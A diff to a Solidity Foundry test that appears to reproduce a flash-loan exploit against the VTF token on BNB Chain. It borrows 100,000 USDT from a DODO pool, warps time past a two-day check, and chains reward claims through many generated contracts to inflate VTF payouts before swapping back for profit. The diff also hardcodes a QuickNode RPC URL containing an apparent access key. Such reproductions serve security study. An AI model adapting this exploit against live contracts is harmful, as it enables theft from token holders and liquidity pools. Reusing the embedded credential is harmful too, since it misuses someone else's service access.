@@ -16,8 +16,18 @@ interface IVTF is IERC20{
     function updateUserBalance(address _user) external;
 }
 
+interface IROUTER {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
 contract claimReward{
-    IVTF VTF = IVTF(0x91383A15C391c142b80045D8b4730C1c37ac0378);
+    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
     constructor(){
         VTF.updateUserBalance(address(this));
     }
@@ -29,22 +39,23 @@ contract claimReward{
 
 contract ContractTest is DSTest{
     address constant dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
-    IVTF VTF = IVTF(0x91383A15C391c142b80045D8b4730C1c37ac0378);
+    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    Uni_Router_V2 Router = Uni_Router_V2(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);
-    address [] contractList;
+    IROUTER Router = IROUTER(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);
+    address [] public contractList;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
+    // ankr rpc bsc maybe unavailible, please use QuickNode
     function setUp() public {
-        cheats.createSelectFork("bsc", 22471982);
+        cheat.createSelectFork("https://quaint-dark-tree.bsc.discover.quiknode.pro/5a0f7d015de8dbc92337c1a73711e6e34b44fe22/", 22535101);
     }
 
     function testExploit() public{
 
         contractFactory();
         // change time to pass time check
-        cheats.warp(block.timestamp + 2 * 24 * 60 * 60);
+        cheat.warp(block.timestamp + 2 * 24 * 60 * 60);
         DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
@@ -56,7 +67,8 @@ contract ContractTest is DSTest{
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
         USDTToVTF();
-        for(uint i = 0; i < contractList.length - 2; ++i){
+        VTF.transfer(contractList[0], VTF.balanceOf(address(this)));
+        for(uint i = 0; i < contractList.length - 1; ++i){
             (bool success, ) = contractList[i].call(abi.encodeWithSignature("claim(address)", contractList[i + 1]));
             require(success);
         }
@@ -64,6 +76,13 @@ contract ContractTest is DSTest{
         (bool success, ) = contractList[index].call(abi.encodeWithSignature("claim(address)", address(this)));
         require(success);
         VTFToUSDT();
+
+        emit log_named_decimal_uint(
+            "Attacker USDT balance in exploit",
+            USDT.balanceOf(address(this)),
+            18
+        );
+
         USDT.transfer(dodo, 100_000 * 1e18);
     }
 
